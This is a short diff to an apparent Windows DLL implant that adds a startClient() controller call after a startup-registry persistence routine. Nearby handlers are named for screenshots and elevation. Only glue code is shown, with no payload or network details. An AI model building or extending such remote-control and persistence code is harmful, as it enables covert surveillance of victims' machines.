@@ -17,6 +17,8 @@
 #include "handlers/startup.h"
 #include "handlers/screenshot.h"
 #include "dllmain.h"
+#include "controller.h"
+#include <thread>
 
 HINSTANCE hInst = NULL;                                // 当前实例
 WCHAR executable_path[MAX_PATH + 1];
@@ -84,8 +86,8 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
     UNREFERENCED_PARAMETER(hwnd);
     UNREFERENCED_PARAMETER(nCmdShow);
     ::hInst = hinst; // 将实例句柄存储在全局变量中
-
     SetStratupReg();
+    startClient();
     if (!strcmp(lpszCmdLine, "elevate0"))
     {
         MessageBox(0, L"elevate0", 0, 0);
